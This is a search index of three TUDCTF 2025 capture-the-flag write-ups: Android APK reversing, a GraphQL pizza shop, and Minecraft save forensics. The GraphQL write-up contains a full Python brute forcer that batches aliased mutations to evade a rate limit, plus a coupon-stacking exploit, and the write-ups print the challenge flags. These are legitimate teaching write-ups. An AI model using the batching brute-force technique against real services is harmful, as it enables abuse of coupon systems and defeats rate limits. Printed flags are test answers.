{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":"<p>Use the links below to navigate to each page.</p>"},{"location":"#pages","title":"Pages","text":"<ul> <li>Nothing</li> <li>Pizzano</li> <li>Signs</li> </ul>"},{"location":"nothing/","title":"TUDCTF 2025 \u2013 Nothing App Writeup (27 solves)","text":"<p>reversing/Nothing App</p> <p>Author: Paul Stokreef </p> <p>Category: reversing</p> <p>Difficulty: Medium</p>"},{"location":"nothing/#introduction","title":"Introduction","text":"<p>The challenge description was short and a bit dramatic:</p> <p>Nonna was developing an Android app to protect the family recipes, but she never finished it - all it does is display an empty black screen, yet the code reveals it's attempting to transmit something encrypted to a hidden server... can you extract the secret before it's lost forever?</p> <p>When I first opened the APK, I really did get a black screen. So I assumed either the app was broken or the challenge wanted me to reverse whatever was happening behind the scenes. Spoiler: it was the second one. Nothing in the UI mattered tho; everything interesting was happening in the code.</p> <p>This writeup goes step-by-step, assuming you\u2019ve never reversed an APK before. The goal: extract whatever \u201csecret\u201d Nonna was trying to send out.</p>"},{"location":"nothing/#step-1-setting-up-the-apk-for-reversing","title":"Step 1: Setting up the APK for Reversing","text":"<p>APK files are basically zip archives, so the first step is to unzip it:</p> <pre><code>unzip chall_k_01.apk -d unpacked\n</code></pre> <p>Inside, you\u2019ll see files and folders like:</p> <ul> <li><code>classes.dex</code></li> <li><code>classes2.dex</code></li> <li><code>AndroidManifest.xml</code></li> <li><code>/res</code></li> <li><code>/assets</code></li> </ul> <p>but most importantly:</p> <ul> <li><code>/com</code></li> </ul> <p>The important one here is the <code>/com</code> folder, since it holds the MainActivity file.</p> <p>To make sense of this, I opened the APK in Jadx GUI.  </p> <p>You can get it here: https://github.com/skylot/jadx</p> <p>Once loaded, I searched for anything that looked meaningful: \u201cflag\u201d, \u201cencrypt\u201d, \u201chttp\u201d, \u201cdata\u201d, etc.</p> <p>Nothing obvious, so I dug deeper into the code structure.</p>"},{"location":"nothing/#step-2-finding-the-real-logic-mainactivity","title":"Step 2: Finding the Real Logic (MainActivity)","text":"<p>Almost all Android apps have an entry point called <code>MainActivity</code>, so that was the first file I checked. Here\u2019s the relevant part the decompiler spit out, heavily cut for readability:</p> <pre><code>Response responseExecute = new OkHttpClient()\n.newCall(\nnew Request.Builder()\n.url(\"http://127.0.0.1:8080/\")\n.header(\"Data\", MainActivity.this.d(\n\"eOi5A6XMZMJ0SZZUqFCJlhFYQIsaYVCF4og9qBWLgAXYgSgKaDpRy64oqpWhrh2w9MimKKhkaSQJwoEiImEAgIuuOLoEwoJ1\",\n\"hossy bossy says hello\"\n))\n.build()\n).execute();\n</code></pre> <p>The app doesn\u2019t show anything on screen. It just fires off a web request to localhost with a header called <code>\"Data\"</code>.</p> <p>That header contains the result of the function:</p> <pre><code>d(\"base64-like string\", \"hossy bossy says hello\")\n</code></pre> <p>This function <code>d()</code> is clearly the decryption routine. There\u2019s no server at 127.0.0.1:8080 in this challenge \u2014 the important part is figuring out what the function returns.</p> <p>If you can reproduce the logic of <code>d()</code>, you can extract the plaintext that Nonna meant to send.</p>"},{"location":"nothing/#step-3-reverse-engineering-the-decryption-function","title":"Step 3: Reverse Engineering the Decryption Function","text":"<p>Here\u2019s the full function:</p> <pre><code>private final String d(String o, String key) {\nint length = o.length() % 4;\nif (length == 2) {\no = o + \"==\";\n} else if (length == 3) {\no = o + \"=\";\n}\nint[] iArr = {95, 88, 68, 68, 78, 23, 85, 88, 68, 68, 78, 23, 68, 86, 78, 68, 23, 95, 82, 91, 91, 88};\nbyte[] bArrDecode = Base64.decode(o, 0);\nbyte[] bArr = new byte[22];\nfor (int i = 0; i &lt; 22; i++) {\nbArr[i] = (byte) (iArr[i] ^ 55);\n}\nbyte[] bArr2 = new byte[bArrDecode.length];\nint length2 = bArrDecode.length;\nfor (int i2 = 0; i2 &lt; length2; i2++) {\nbArr2[i2] = (byte) (d$r(bArrDecode[i2] &amp; 255, (i2 % 5) + 1) ^ (bArr[i2 % 22] &amp; 255));\n}\nreturn new String(bArr2, Charsets.UTF_8);\n}\n</code></pre> <p>Don't worry, I haven't magically coded this. Right in MainActivity is this function.</p> <p>This thing does three operations:</p> <ol> <li>Fix Base64 padding if needed</li> <li>Base64-decode the ciphertext</li> <li>XOR it with a repeating key that is itself derived by XORing integers with 55</li> <li>Rotate each byte before XORing</li> </ol> <p>The rotate happens here:</p> <pre><code>private static final int d$r(int i, int i2) {\nreturn ((i &lt;&lt; (8 - i2)) | (i &gt;&gt;&gt; i2)) &amp; 255;\n}\n</code></pre> <p>This is a classic \u201crotate right then XOR with key\u201d encoder.</p> <p>So to recover the plaintext, I rewrote this logic in Python.</p>"},{"location":"nothing/#step-4-rewriting-the-decryption-in-python","title":"Step 4: Rewriting the Decryption in Python","text":"<p>Below is a Python translation of the algorithm. It reproduces the exact behavior of the Kotlin function:</p> <pre><code>import base64\n\ndef ror(byte, shift):\n    return ((byte &gt;&gt; shift) | ((byte &lt;&lt; (8 - shift)) &amp; 0xFF)) &amp; 0xFF\n\ncipher_b64 = \"eOi5A6XMZMJ0SZZUqFCJlhFYQIsaYVCF4og9qBWLgAXYgSgKaDpRy64oqpWhrh2w9MimKKhkaSQJwoEiImEAgIuuOLoEwoJ1\"\niArr = [95, 88, 68, 68, 78, 23, 85, 88, 68, 68, 78, 23, 68, 86, 78, 68, 23, 95, 82, 91, 91, 88]\n\n# Padding fix\nmissing = len(cipher_b64) % 4\nif missing == 2:\n    cipher_b64 += \"==\"\nelif missing == 3:\n    cipher_b64 += \"=\"\n\ncipher = base64.b64decode(cipher_b64)\n\n# Key derivation\nkey = bytes([(x ^ 55) for x in iArr])\n\n# Decrypt\npt = []\nfor i, b in enumerate(cipher):\n    rotated = ror(b, (i % 5) + 1)\n    pt.append(rotated ^ key[i % len(key)])\n\nprint(bytes(pt).decode())\n</code></pre> <p>Running it gives the plaintext immediately.</p>"},{"location":"nothing/#step-5-the-flag","title":"Step 5: The Flag","text":"<p>The decrypted string is:</p> <pre><code>TUDCTF{74925fd58dca0a7b7d7653332b82dc4562f96e84e6f1ef52219ab10ed08f83e8}\n</code></pre> <p>This is the final flag. It makes sense: typical hex-based secret, wrapped in the TUDCTF format.</p> <p>Even though the ciphertext started as Base64, the output was not Base64, it was already a UTF-8 string.</p>"},{"location":"nothing/#lessons-learned","title":"Lessons Learned","text":"<p>This challenge is a gentle introduction to reversing Android apps. You don\u2019t need dynamic analysis, emulators, or Frida. Everything important was:</p> <ol> <li>Looking into the decompiled <code>MainActivity</code></li> <li>Finding the encryption/decryption logic</li> <li>Translating the algorithm into Python</li> <li>Running it manually</li> </ol> <p>If you\u2019re new to Android reversing, the key tools to learn are:</p> <ul> <li> <p>Androidtools: https://github.com/mu71l473d/androidtools</p> </li> <li> <p>Jadx  https://github.com/skylot/jadx  </p> </li> </ul>"},{"location":"nothing/#final-thoughts","title":"Final Thoughts","text":"<p>This was a fun, clean reversing challenge: no obfuscation, no JNI, no hidden classes. Just Kotlin, Base64, and some light byte-twisting. The empty black screen was a nice misdirection. All the action was happening in code that only runs once.</p> <p>If you\u2019re completely new to Android reversing, this is a great entry point: you get to trace a real decryption routine without fighting the usual mountain of obfuscation or native libraries.</p> <p>Flag:</p> <pre><code>TUDCTF{74925fd58dca0a7b7d7653332b82dc4562f96e84e6f1ef52219ab10ed08f83e8}\n</code></pre> <p>Good luck to everyone submitting their writeups.</p>"},{"location":"pizzano/","title":"TUDCTF 2025 Pizzano's Domi - Full Writeup (5 solves)","text":"<p>web/Pizzano's Domi</p> <p>Author: Paul Stokreef</p> <p>Solver: Teun van der Ploeg</p> <p>Platform: TU Delft CTF 2025</p> <p>Category: web</p> <p>Difficulty: Medium-Hard</p> <p></p>"},{"location":"pizzano/#fun-fact-i-always-use-exactly-this-picture-for-embedding-exploits-dont-know-what-you-can-do-with-this-info-maybe-also-use-it-at-some-point-in-life-look-at-him-mister-cool-paul","title":"fun fact: i always use exactly this picture for embedding exploits. don't know what you can do with this info, maybe also use it at some point in life. look at him, mister cool. -Paul","text":""},{"location":"pizzano/#1-introduction","title":"1. Introduction","text":"<p>This challenge revolves around a pizza ordering site with a GraphQL backend. The idea is simple: ordering a special pizza called <code>FLAG</code> returns the real capture-the-flag token, as long as the total discounted price stays under 500 euros. The price of the flag pizza is 1337 euros by default, so a sufficiently strong coupon is required.</p> <p>At first glance, the application rate-limits requests so heavily that brute forcing the coupon space looks impossible. The GraphQL backend contains 200 randomly generated coupons at startup, each five digits long. The code space is 100,000 possibilities. With a rate limit of 20 requests every 30 seconds, guessing the correct coupon appears impossible.</p> <p>It turns out there is a path inside the working of GraphQL aliasing: batching multiple operations inside a single HTTP request. That one detail enables a fairly clean exploitation path.</p> <p>This writeup explains the full approach, including backend analysis, rate limit bypass, batch exploitation, and the final coupon stacking path to retrieve the flag.</p>"},{"location":"pizzano/#2-overview-of-the-application-structure","title":"2. Overview of the Application Structure","text":"<p>The system consists of:</p> <ul> <li> <p>A Bun-based frontend server acting as a reverse proxy</p> </li> <li> <p>A Rust GraphQL backend implementing the coupon logic</p> </li> <li> <p>Docker configuration passing the flag to the GraphQL binary via environment variables</p> </li> </ul> <p>The frontend rate-limits requests to /graphql. The backend contains the actual vulnerability.</p>"},{"location":"pizzano/#3-the-frontend-proxy-and-rate-limiting","title":"3. The Frontend Proxy and Rate Limiting","text":"<p>The Bun server proxies /graphql to the Rust service running on port 8000. The key section is:</p> <pre><code>const RATE_LIMIT_WINDOW_MS = 30_000;\nconst RATE_LIMIT_MAX = 20;\n\n&lt;SNIP&gt;\n\n\"/graphql\": async (req: Request) =&gt; {\nconst now = Date.now();\n\ntimestamps = timestamps.filter((t) =&gt; t &gt; now - RATE_LIMIT_WINDOW_MS);\n\nif (timestamps.length &gt;= RATE_LIMIT_MAX) {\nconst oldest = timestamps[0] ?? now;\nconst retryAfterMs = RATE_LIMIT_WINDOW_MS - (now - oldest);\nconst retryAfterSec = Math.max(1, Math.ceil(retryAfterMs / 1000));\nreturn new Response(\"Too Many Requests\", {\nstatus: 429,\nheaders: {\n\"Content-Type\": \"text/plain\",\n\"Retry-After\": String(retryAfterSec),\n},\n});\n}\n\n&lt;SNIP&gt;\n</code></pre> <p>This enforces at most 20 requests in any 30-second window. But this limit applies only to HTTP requests, not to GraphQL operations inside one request. That is the first observation enabling the bypass.</p>"},{"location":"pizzano/#4-backend-coupon-logic","title":"4. Backend Coupon Logic","text":"<p>The Rust backend generates 200 coupons at startup:</p> <pre><code>static COUPONS: OnceLock&lt;HashMap&lt;String, CouponType&gt;&gt; = OnceLock::new();\n</code></pre> <p>Each coupon is a 5-digit numeric string. Coupon types include:\"</p> <pre><code>#[derive(Clone, PartialEq)]\npub enum CouponType {\nNone,\nPercentage { discount: f64 },\nNthItem { nth: usize, discount: f64 },\nFlatDiscount { amount: f64 },\nPizzaSpecific { pizza: Pizza, discount: f64 },\nThreshold { minimum: f64, discount: f64 },\nStackingDiscount { tier1: f64, tier2: f64, tier3: f64 },\n}\n</code></pre> <p>And a single special 100% discount coupon.</p> <p>Internally, the backend applies coupon logic per pizza, then applies flat and threshold coupons at the basket level. The important part comes from this detail in the order mutation:</p> <pre><code>if validation_result.total_discounted_price &gt; 500.0 {\nreturn Ok(OrderResult {\nsuccess: false,\nmessage: \"Order too expensive! Total must be under \u20ac500.00\".to_string(),\nflag: None,\n});\n}\n\nlet has_flag_pizza = input.pizzas.iter().any(|p| *p == Pizza::Flag);\n\nlet flag = if has_flag_pizza {\nSome(std::env::var(\"FLAG\").unwrap_or_else(|_| \"TUDCTF{fake_flag_for_testing}\".to_string()))\n} else {\nNone\n};\n</code></pre> <p>If the basket total is \u2264 500 and includes the Flag pizza, the challenge flag is returned.</p>"},{"location":"pizzano/#5-why-brute-force-looks-impossible","title":"5. Why Brute Force Looks Impossible","text":"<p>The coupon codes are randomly generated five-digit numbers, so the search space is 100k.</p> <p>With the enforced rate limit (20 requests per 30 seconds), and each request containing at most a single validateBasket call, brute forcing 100k codes would take nearly seven hours even under ideal conditions.</p> <p>Given that the challenge likely expects a faster solution, there must be another avenue.</p> <p>The obvious missing element is GraphQL aliasing.</p>"},{"location":"pizzano/#6-graphql-aliasing-as-a-bypass","title":"6. GraphQL Aliasing as a Bypass","text":"<p>You are allowed to call the same mutation multiple times inside one GraphQL request using aliases:</p> <pre><code>mutation {\na: validateBasket(input: {...})\nb: validateBasket(input: {...})\nc: validateBasket(input: {...})\n}\n</code></pre> <p>The backend processes each one independently, but Bun only sees this as a single HTTP request. So instead of one coupon test per request, we can perform dozens or hundreds at once.</p> <p>Each validateBasket allows up to six coupon codes, so a single batched request can test:</p> <pre><code>aliases \u00d7 6 codes\n</code></pre> <p>Using around 50 aliases gives 300 coupons checked per request. At 20 requests per window, that becomes roughly 6000 coupons every 30 seconds.</p> <p>This immediately reduces the expected brute forcing time for the entire code space from hours to minutes.</p>"},{"location":"pizzano/#7-sample-batched-request","title":"7. Sample Batched Request","text":"<p>Here is a minimal example checking 30 coupon codes (00000\u201300029) using five aliases:</p> <pre><code>POST /graphql HTTP/1.1\nHost: 9cdc02c2ab20.challs.tudc.tf:30155\nContent-Type: application/json\n\n{\n\"query\": \"mutation {\n    b0: validateBasket(input: { pizzas: [], couponCodes: [\\\"00000\\\",\\\"00001\\\",\\\"00002\\\",\\\"00003\\\",\\\"00004\\\",\\\"00005\\\"] }) {\n      appliedCoupons { code description discountType isValid }\n    }\n    b1: validateBasket(input: { pizzas: [], couponCodes: [\\\"00006\\\",\\\"00007\\\",\\\"00008\\\",\\\"00009\\\",\\\"00010\\\",\\\"00011\\\"] }) {\n      appliedCoupons { code description discountType isValid }\n    }\n    b2: validateBasket(input: { pizzas: [], couponCodes: [\\\"00012\\\",\\\"00013\\\",\\\"00014\\\",\\\"00015\\\",\\\"00016\\\",\\\"00017\\\"] }) {\n      appliedCoupons { code description discountType isValid }\n    }\n    b3: validateBasket(input: { pizzas: [], couponCodes: [\\\"00018\\\",\\\"00019\\\",\\\"00020\\\",\\\"00021\\\",\\\"00022\\\",\\\"00023\\\"] }) {\n      appliedCoupons { code description discountType isValid }\n    }\n    b4: validateBasket(input: { pizzas: [], couponCodes: [\\\"00024\\\",\\\"00025\\\",\\\"00026\\\",\\\"00027\\\",\\\"00028\\\",\\\"00029\\\"] }) {\n      appliedCoupons { code description discountType isValid }\n    }\n  }\"\n}\n</code></pre> <p>Scaling this structure gives access to hundreds of coupon checks per request while remaining inside the rate limit.</p>"},{"location":"pizzano/#8-full-python-brute-forcer","title":"8. Full Python Brute Forcer","text":"<p>Below is the full brute forcing script that uses GraphQL aliasing to test thousands of codes per minute. It outputs any valid coupons and stops upon finding a strong enough discount.</p> <pre><code>#!/usr/bin/env python3\nimport requests\nimport time\nimport re\nimport csv\n\nURL = \"http://9cdc02c2ab20.challs.tudc.tf:30155/graphql\" # Or input wherever you're running the app. localhost:3000/graphql\n\nCODES_PER_BASKET = 6\nBASKETS_PER_REQUEST = 50\nRATE_LIMIT_DELAY = 1.6\n\nCSV_FILENAME = \"coupons_fast.csv\"\n\n\ndef build_query(code_groups):\n    parts = [\"mutation {\"]\n\n    for idx, group in enumerate(code_groups):\n        alias = f\"b{idx}\"\n        codes_list = \", \".join(f'\"{c}\"' for c in group)\n        parts.append(\n            f\"\"\"  {alias}: validateBasket(input: {{\n    pizzas: [],\n    couponCodes: [{codes_list}]\n}}) {{\n    appliedCoupons {{\n      code\n      description\n      discountType\n      isValid\n}}\n}}\"\"\"\n        )\n\n    parts.append(\"}\")\n    return \"\\n\".join(parts)\n\n\ndef send_mutation(query):\n    payload = {\"query\": query}\n\n    while True:\n        r = requests.post(URL, json=payload)\n        if r.status_code == 429:\n            retry = r.headers.get(\"Retry-After\", \"5\")\n            time.sleep(int(retry))\n            continue\n        if r.status_code != 200:\n            time.sleep(3)\n            continue\n\n        data = r.json()\n        if \"errors\" in data:\n            time.sleep(3)\n            continue\n\n        return data[\"data\"]\n\n\ndef is_interesting_coupon(c):\n    if not c.get(\"isValid\"):\n        return False\n\n    dtype = c.get(\"discountType\")\n    desc = c.get(\"description\") or \"\"\n\n    if dtype == \"Percentage\" and \"100\" in desc:\n        return True\n\n    if dtype == \"Threshold\":\n        m = re.match(r\"(\\d+)%\", desc)\n        if m:\n            pct = int(m.group(1))\n            if pct &gt;= 20:\n                return True\n\n    return False\n\n\ndef brute_force(start=0, end=100000):\n    with open(CSV_FILENAME, \"w\", newline=\"\") as f:\n        writer = csv.writer(f)\n        writer.writerow([\"code\", \"type\", \"description\"])\n\n        current = start\n        while current &lt; end:\n            code_groups = []\n            for _ in range(BASKETS_PER_REQUEST):\n                if current &gt;= end:\n                    break\n                group = [f\"{i:05d}\" for i in range(current, min(current + CODES_PER_BASKET, end))]\n                code_groups.append(group)\n                current += CODES_PER_BASKET\n\n            query = build_query(code_groups)\n            data = send_mutation(query)\n\n            for alias, basket in data.items():\n                for c in basket[\"appliedCoupons\"]:\n                    if c.get(\"isValid\"):\n                        writer.writerow([\n                            c.get(\"code\"),\n                            c.get(\"discountType\"),\n                            c.get(\"description\")\n                        ])\n                        if is_interesting_coupon(c):\n                            return c\n\n            time.sleep(RATE_LIMIT_DELAY)\n\n    return None\n\n\nif __name__ == \"__main__\":\n    coupon = brute_force()\n    print(\"Found coupon:\", coupon)\n</code></pre> <p>The script finds a Threshold coupon with a sufficiently high discount.</p>"},{"location":"pizzano/#9-final-exploit","title":"9. Final Exploit","text":"<p>Once a good coupon has been found, the remaining step is to reuse the same coupon multiple times in an order. The backend does not check whether a coupon is applied more than once.</p> <p>Here is the mutation that actually produces the flag:</p> <pre><code>mutation Order($input: ValidateBasketInput!) {\norder(input: $input) {\nsuccess\nmessage\nflag\n}\n}\n</code></pre> <p>Variables:</p> <pre><code>{\n\"input\": {\n\"pizzas\": [\"FLAG\"],\n\"couponCodes\": [\n\"18493\",\n\"18493\",\n\"18493\",\n\"18493\",\n\"18493\",\n\"18493\"\n]\n}\n}\n</code></pre> <p>This brought the total price below the required 500 euro limit, and the backend returned:</p>"},{"location":"pizzano/#kalikali-curl-x-post-httplocalhost3000graphql-h-content-type-applicationjson-data-exploitjson-dataordersuccesstruemessageorder-placed-successfully-total-23796flagtudctfredacted","title":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -X POST http://localhost:3000/graphql \\\n  -H \"Content-Type: application/json\" \\\n  --data @exploit.json\n\n{\"data\":{\"order\":{\"success\":true,\"message\":\"Order placed successfully! Total: \u20ac237.96\",\"flag\":\"TUDCTF{redacted}\"}}}\n</code></pre>","text":""},{"location":"pizzano/#10-closing-remarks","title":"10. Closing Remarks","text":"<p>The core problem in this challenge is the interaction between a rate-limited HTTP proxy and an unbounded GraphQL backend. As soon as the system allows multiple GraphQL operations in one HTTP request, the effective brute force rate grows by orders of magnitude. The remaining mistake is permitting a coupon to be applied repeatedly in a single order without further checks.</p> <p>GraphQL aliasing continues to be an underrated attack surface. This challenge illustrates how even a simple rate-limit can be bypassed outright via batching.</p>"},{"location":"signs/","title":"TUDCTF 2025 - Minecraft save (46 solves)","text":"<p>forensics/Yearn for the Signs</p> <p>Author: Paul Stokreef </p> <p>Category: forensics</p> <p>Difficulty: Easy</p>"},{"location":"signs/#1-introduction","title":"1. Introduction","text":"<p>Minecraft worlds store almost all gameplay data, including blocks, entities, signs, books, and even command block text, inside compressed region files ending in .mca.</p> <p>In this challenge, the hidden flag was stored inside a sign\u2019s text, deep inside an MCA region file.</p> <pre><code>I have hidden my secret on a sign somewhere in this world. Good luck finding it now!\n\nNote: You do not need an instance of Minecraft to solve this challenge.\n</code></pre>"},{"location":"signs/#2-extracting-the-world-save-zip","title":"2. Extracting the World Save ZIP","text":"<p>When you've downloaded the world save zip, inside it will be a typical Minecraft Java edition world layout:</p> <pre><code>25-11-2025  20:42    &lt;DIR&gt;          .\n25-11-2025  20:41    &lt;DIR&gt;          ..\n08-08-2025  10:59    &lt;DIR&gt;          advancements\n08-08-2025  10:59    &lt;DIR&gt;          data\n08-08-2025  10:59    &lt;DIR&gt;          datapacks\n08-08-2025  10:59    &lt;DIR&gt;          DIM-1\n08-08-2025  10:59    &lt;DIR&gt;          DIM1\n08-08-2025  11:05    &lt;DIR&gt;          entities\n08-08-2025  10:59             7.972 icon.png\n08-08-2025  11:03             2.412 level.dat\n08-08-2025  11:03             2.413 level.dat_old\n08-08-2025  11:03    &lt;DIR&gt;          playerdata\n08-08-2025  11:05    &lt;DIR&gt;          poi\n08-08-2025  11:04    &lt;DIR&gt;          region\n08-08-2025  11:00                 3 session.lock\n08-08-2025  10:59    &lt;DIR&gt;          stats\n</code></pre> <p>All blocks and signs in the overworld are stored inside:</p> <pre><code>world/region/*.mca\n</code></pre> <p>These .mca files contain the chunk data, compressed with Zlib, stored in the NBT (Named Binary Tag) format.</p>"},{"location":"signs/#3-identifying-interesting-files","title":"3. Identifying Interesting Files","text":"<p>Flags stored inside the world almost always end up in one of:</p> <ul> <li>Signs</li> <li>Books</li> <li>Command Blocks</li> <li>Lecterns</li> </ul> <p>These live inside the MCA region files under tags like block_entities and TileEntities</p> <p>Since the challenge gave me only one region file (r.0.0.mca), I focused on that.</p>"},{"location":"signs/#4-understanding-the-mca-format","title":"4. Understanding the MCA Format","text":"<p>Minecraft region files (.mca) use this layout:</p> <ul> <li> <p>Sector table (4096 bytes)</p> <ul> <li>First 4 KB list chunk offsets &amp; lengths</li> </ul> </li> <li> <p>Chunk data</p> <ul> <li> <p>Each chunk is:</p> <ul> <li> <p>Length (4 bytes)</p> </li> <li> <p>Compression type (1 byte: 1 = GZip, 2 = Zlib)</p> </li> <li> <p>Zlib-compressed NBT data</p> </li> </ul> </li> </ul> </li> </ul> <p>NBT uses structured tags such as:</p> <pre><code>TAG_Compound\nTAG_List\nTAG_String\nTAG_Int\n</code></pre> <p>Signs are stored like:</p> <pre><code>\"block_entities\": [\n{\n\"id\": \"minecraft:sign\",\n\"front_text\": {\n\"messages\": [ \"Line1\", \"Line2\", \"Line3\", \"Line4\" ]\n}\n}\n]\n</code></pre> <p>So our goal is to find the chunk that contains a sign, decompress it, extract the messages and the flag appears.</p>"},{"location":"signs/#5-searching-the-region-file-for-zlib-streams","title":"5. Searching the Region File for Zlib Streams","text":"<p>Even without parsing the MCA index, we can scan for Zlib streams because they all start with:</p> <pre><code>78 9C  (hex)\n</code></pre> <p>In Python:</p> <pre><code>indices=[]\nfor i in range(len(data)-2):\n    if data[i]==0x78 and data[i+1]==0x9c:\n        indices.append(i)\n</code></pre> <p>This found hundreds of decompression points.</p> <p>For each candidate Zlib stream, I attempted:</p> <pre><code>d = zlib.decompress(data[idx:])\n</code></pre> <p>Most of these decompress into valid NBT blobs.</p>"},{"location":"signs/#6-searching-for-text-in-decompressed-chunks","title":"6. Searching for Text in Decompressed Chunks","text":"<p>Once decompressed, I scanned for anything readable:</p> <pre><code>strings = re.findall(rb\"[ -~]{6,}\", decompressed_blob)\n</code></pre> <p>Many chunks contained block names, palette data, heightmaps, etc. But what we are after is sign text, which usually contains the key \u201cmessages\u201d.</p> <p>So I filtered for NBT fields named \"messages\":</p> <p><pre><code>if b'messages' in d:\n    print(d)\n</code></pre>  And only one chunk matched!</p>"},{"location":"signs/#7-locating-the-flag-inside-the-signs-messages","title":"7. Locating the Flag Inside the Sign\u2019s Messages","text":"<p>The decompressed chunk contained this structure:</p> <pre><code>messages\n    \"\"\n    \"\"\n    \"\"\n    \"\"\n</code></pre> <p>But not empty this time; the messages were UTF-8 strings, each one a piece of the flag.</p> <p>From the actual decompressed binary, I extracted the readable strings:</p> <pre><code>re.findall(rb'\"([^\"]*)\"', d[pos-50:pos+200])\n</code></pre> <p>This returned:</p> <pre><code>b'TUDCTF{As-4_cH1'\nb'lD_1-yE4rn3d-f0'\nb'r-thE_M1n3S}'\n</code></pre> <p>These three strings are the 4 lines of the Minecraft sign, each containing part of the flag.</p>"},{"location":"signs/#8-reconstructing-the-flag","title":"8. Reconstructing the Flag","text":"<p>Concatenating the fragments becomes:</p> <pre><code>TUDCTF{As-4_cH1lD_1-yE4rn3d-f0r-thE_M1n3S}\n</code></pre>"}]}